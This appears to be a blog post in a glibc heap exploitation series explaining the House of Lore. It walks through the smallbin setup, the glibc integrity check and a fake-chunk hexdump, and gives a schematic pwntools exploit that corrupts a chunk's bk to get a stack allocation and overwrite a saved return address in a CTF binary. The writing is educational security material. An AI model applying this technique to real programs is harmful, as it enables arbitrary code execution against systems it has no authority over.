@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>the House of Lore — algoatson.github.io</title>
+<meta name="description" content="Part 12 — the smallbins are doubly-linked and handed out from the tail. Overwrite a smallbin chunk&#x27;s bk to point at a fake chunk and malloc will walk right into it, returning a chunk on the stack. The unlink check just needs a back-pointer.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/the-house-of-lore/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="the House of Lore — algoatson.github.io">
+<meta property="og:description" content="Part 12 — the smallbins are doubly-linked and handed out from the tail. Overwrite a smallbin chunk&#x27;s bk to point at a fake chunk and malloc will walk right into it, returning a chunk on the stack. The unlink check just needs a back-pointer.">
+<meta property="og:url" content="https://algoatson.github.io/p/the-house-of-lore/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/the-house-of-lore.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "the House of Lore", "datePublished": "2026-06-14", "dateModified": "2026-06-14", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "Part 12 — the smallbins are doubly-linked and handed out from the tail. Overwrite a smallbin chunk's bk to point at a fake chunk and malloc will walk right into it, returning a chunk on the stack. The unlink check just needs a back-pointer.", "url": "https://algoatson.github.io/p/the-house-of-lore/", "mainEntityOfPage": "https://algoatson.github.io/p/the-house-of-lore/", "keywords": "heap, pwn, glibc"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>the House of Lore</h1>
+  <div class="meta"><span>2026-06-14</span><span>3 min read</span><a class="tag" href="/tags/heap/">heap</a> <a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/glibc/">glibc</a></div>
+</header>
+<aside class="series" aria-label="series navigation"><div class="series__head"><span class="series__label">series</span><span class="series__name">glibc heap exploitation</span><span class="series__pos">part 12 of 14</span></div><ol class="series__list"><li><a href="/p/glibc-heap-internals/">the glibc heap, from the chunk up</a></li><li><a href="/p/house-of-force/">the House of Force</a></li><li><a href="/p/fastbin-dup/">fastbin dup</a></li><li><a href="/p/unsafe-unlink/">unsafe unlink (and the safe-unlink bypass)</a></li><li><a href="/p/the-unsorted-bin-attack/">the unsorted bin attack</a></li><li><a href="/p/tcache-poisoning-explained/">tcache poisoning, explained like you&#x27;ll have to use it</a></li><li><a href="/p/house-of-spirit/">the House of Spirit</a></li><li><a href="/p/poison-null-byte/">the poison null byte</a></li><li><a href="/p/the-house-of-orange/">the House of Orange</a></li><li><a href="/p/tcache-dup/">tcache dup</a></li><li><a href="/p/the-house-of-einherjar/">the House of Einherjar</a></li><li class="cur" aria-current="true">the House of Lore</li><li><a href="/p/the-house-of-rabbit/">the House of Rabbit</a></li><li><a href="/p/the-house-of-corrosion/">the House of Corrosion</a></li></ol></aside>
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#getting-a-chunk-into-a-smallbin-first">getting a chunk into a smallbin first</a></li>
+<li><a href="#walk-the-bk-into-a-fake-chunk">walk the bk into a fake chunk</a></li>
+<li><a href="#limitations">limitations</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>The fastbin and tcache attacks corrupt singly-linked lists. The House of Lore goes
+after the <strong>smallbins</strong> — doubly-linked, exact-size, served from the <em>tail</em> via
+<code class="highlight">bk</code>. Overwrite a smallbin chunk's <code class="highlight">bk</code> to point at a fake chunk and the next-but-one
+allocation of that size is your fake chunk. With it placed on the stack, <code class="highlight">malloc</code>
+hands you a write over a saved return address.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./lore</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.27</dd></div><div><dt>technique</dt><dd>overwrite a smallbin chunk&#x27;s bk -&gt; allocate a fake chunk (e.g. the stack)</dd></div><div><dt>needs</dt><dd>control of a smallbin chunk&#x27;s bk + two fake chunks with fd back-pointers</dd></div></dl></div></figure>
+<h2 id="getting-a-chunk-into-a-smallbin-first">getting a chunk into a smallbin first<a class="headerlink" href="#getting-a-chunk-into-a-smallbin-first" title="Permanent link">#</a></h2>
+<p>Smallbins only fill when the allocator <em>sorts</em> the unsorted bin, so the setup is a
+two-step shuffle: free a small-sized chunk (it lands in the unsorted bin), then make
+a request that forces a sort, which moves it into its smallbin.</p>
+<figure class="codeblock"><figcaption><span class="fname">park a victim in its smallbin</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#park-a-victim-in-its-smallbin-1">1</a></span>
+<span class="normal"><a href="#park-a-victim-in-its-smallbin-2">2</a></span>
+<span class="normal"><a href="#park-a-victim-in-its-smallbin-3">3</a></span>
+<span class="normal"><a href="#park-a-victim-in-its-smallbin-4">4</a></span>
+<span class="normal"><a href="#park-a-victim-in-its-smallbin-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="park-a-victim-in-its-smallbin-1"><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">victim</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span><span class="w">    </span><span class="c1">// small-sized</span>
+</span><span id="park-a-victim-in-its-smallbin-2"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span><span class="w">                   </span><span class="c1">// guard, so victim doesn&#39;t merge with top</span>
+</span><span id="park-a-victim-in-its-smallbin-3"><span class="c1">// (fill the tcache for this size on glibc &gt;= 2.26 so the free reaches the bins)</span>
+</span><span id="park-a-victim-in-its-smallbin-4"><span class="n">free</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span><span class="w">                   </span><span class="c1">// -&gt; unsorted bin</span>
+</span><span id="park-a-victim-in-its-smallbin-5"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span><span class="w">                  </span><span class="c1">// a larger request sorts the unsorted bin -&gt; victim now in smallbin[0x90]</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="walk-the-bk-into-a-fake-chunk">walk the bk into a fake chunk<a class="headerlink" href="#walk-the-bk-into-a-fake-chunk" title="Permanent link">#</a></h2>
+<p>Removing a chunk from a smallbin is a partial <code class="highlight">unlink</code> from the tail, with one
+guard:</p>
+<figure class="codeblock"><figcaption><span class="fname">glibc _int_malloc — smallbin path, abridged</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#glibc-int-malloc-smallbin-path-abridged-1">1</a></span>
+<span class="normal"><a href="#glibc-int-malloc-smallbin-path-abridged-2">2</a></span>
+<span class="normal"><a href="#glibc-int-malloc-smallbin-path-abridged-3">3</a></span>
+<span class="normal"><a href="#glibc-int-malloc-smallbin-path-abridged-4">4</a></span>
+<span class="normal"><a href="#glibc-int-malloc-smallbin-path-abridged-5">5</a></span>
+<span class="normal"><a href="#glibc-int-malloc-smallbin-path-abridged-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="glibc-int-malloc-smallbin-path-abridged-1"><span class="n">victim</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">last</span><span class="w"> </span><span class="p">(</span><span class="n">bin</span><span class="p">);</span><span class="w">              </span><span class="c1">// tail of the smallbin (via bk)</span>
+</span><span id="glibc-int-malloc-smallbin-path-abridged-2"><span class="n">bck</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span><span id="glibc-int-malloc-smallbin-path-abridged-3"><span class="hll"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__glibc_unlikely</span><span class="w"> </span><span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">victim</span><span class="p">))</span>
+</span></span><span id="glibc-int-malloc-smallbin-path-abridged-4"><span class="w">    </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;malloc(): smallbin double linked list corrupted&quot;</span><span class="p">);</span>
+</span><span id="glibc-int-malloc-smallbin-path-abridged-5"><span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bck</span><span class="p">;</span>
+</span><span id="glibc-int-malloc-smallbin-path-abridged-6"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bin</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>So overwrite <code class="highlight">victim-&gt;bk</code> to point at a <strong>fake chunk</strong> whose <code class="highlight">fd</code> points back at
+<code class="highlight">victim</code> — that satisfies <code class="highlight">bck-&gt;fd == victim</code>. One allocation returns <code class="highlight">victim</code>; the
+next returns your fake chunk. Because the <em>second</em> removal checks the fake chunk's
+<code class="highlight">bk-&gt;fd</code> too, you chain a <strong>second</strong> fake chunk behind it:</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">fake chunk #1 on the stack — fd points back at victim</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  00 00 00 00 00 00 00 00  a1 00 00 00 00 00 00 00  <span class="asc">|................|</span>
+<span class="off">00000010</span>  <mark>90</mark> <mark>e2</mark> <mark>ff</mark> <mark>ff</mark> <mark>ff</mark> <mark>7f</mark> <mark>00</mark> <mark>00</mark>  <mark>a0</mark> <mark>d3</mark> <mark>ff</mark> <mark>ff</mark> <mark>ff</mark> <mark>7f</mark> <mark>00</mark> <mark>00</mark>  <span class="asc">|<mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark>|</span></pre></div></figure>
+<p>(<code class="highlight">fd = &amp;victim</code>, <code class="highlight">bk = &amp;fake2</code>; <code class="highlight">fake2-&gt;fd = &amp;fake1</code> keeps the next check happy.)</p>
+<figure class="codeblock"><figcaption><span class="fname">lore.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#lorepy-1"> 1</a></span>
+<span class="normal"><a href="#lorepy-2"> 2</a></span>
+<span class="normal"><a href="#lorepy-3"> 3</a></span>
+<span class="normal"><a href="#lorepy-4"> 4</a></span>
+<span class="normal"><a href="#lorepy-5"> 5</a></span>
+<span class="normal"><a href="#lorepy-6"> 6</a></span>
+<span class="normal"><a href="#lorepy-7"> 7</a></span>
+<span class="normal"><a href="#lorepy-8"> 8</a></span>
+<span class="normal"><a href="#lorepy-9"> 9</a></span>
+<span class="normal"><a href="#lorepy-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="lorepy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="lorepy-2"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./lore&quot;</span><span class="p">)</span>
+</span><span id="lorepy-3"><span class="n">stack</span> <span class="o">=</span> <span class="n">leak_stack</span><span class="p">()</span>
+</span><span id="lorepy-4"><span class="n">fake1</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0x20</span>                       <span class="c1"># where you want malloc to return</span>
+</span><span id="lorepy-5"><span class="hll"><span class="n">forge</span><span class="p">(</span><span class="n">fake1</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="n">victim_addr</span><span class="p">,</span> <span class="n">bk</span><span class="o">=</span><span class="n">fake1</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>    <span class="c1"># fake1</span>
+</span></span><span id="lorepy-6"><span class="hll"><span class="n">forge</span><span class="p">(</span><span class="n">fake1</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="n">fake1</span><span class="p">)</span>                     <span class="c1"># fake2, fd back-pointer</span>
+</span></span><span id="lorepy-7"><span class="n">edit</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">bk</span><span class="o">=</span><span class="n">fake1</span><span class="p">)</span>                     <span class="c1"># corrupt the smallbin chunk&#39;s bk</span>
+</span><span id="lorepy-8"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>                                <span class="c1"># == victim</span>
+</span><span id="lorepy-9"><span class="n">buf</span> <span class="o">=</span> <span class="n">alloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>                          <span class="c1"># == fake1, on the stack</span>
+</span><span id="lorepy-10"><span class="n">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">rop_chain</span><span class="p">)</span>                       <span class="c1"># over the saved return address</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>the shell</summary>
+<p><code class="highlight">fake1</code> straddles the saved RIP; one write drops a ROP chain and the function
+returns into it:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{l0r3_st0ry_t1m3}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="limitations">limitations<a class="headerlink" href="#limitations" title="Permanent link">#</a></h2>
+<ul>
+<li>you need to control a smallbin chunk's <code class="highlight">bk</code> (an overflow or UAF into a <em>sorted</em>
+  chunk) and usually a leak for the fake-chunk addresses;</li>
+<li>the <code class="highlight">bck-&gt;fd == victim</code> check forces the back-pointer dance (hence two fakes);</li>
+<li>on tcache glibc you must fill the tcachebin so frees reach the smallbins at all.</li>
+</ul>
+<p>It's the doubly-linked-list sibling of <a href="/p/tcache-poisoning-explained/">tcache poisoning</a>:
+same "allocate where I say," via <code class="highlight">bk</code> instead of <code class="highlight">fd</code>. Next, <a href="/p/the-house-of-rabbit/">the House of
+Rabbit</a> — forging a <em>giant</em> free chunk out of the fastbins
+with almost no primitive at all.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/house-of-spirit/"><span class="row__date">2026-06-14</span><span class="row__tag">heap</span><span class="row__title">the House of Spirit</span><span class="row__min">4 min</span></a><a class="row" href="/p/poison-null-byte/"><span class="row__date">2026-06-14</span><span class="row__tag">heap</span><span class="row__title">the poison null byte</span><span class="row__min">3 min</span></a><a class="row" href="/p/tcache-dup/"><span class="row__date">2026-06-14</span><span class="row__tag">heap</span><span class="row__title">tcache dup</span><span class="row__min">3 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/the-house-of-einherjar/"><span class="lbl">&#8249; newer</span>the House of Einherjar</a><a class="next" href="/p/the-house-of-orange/"><span class="lbl">older &#8250;</span>the House of Orange</a></nav></main>
+
+    <footer class="status">
+      <span>28 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
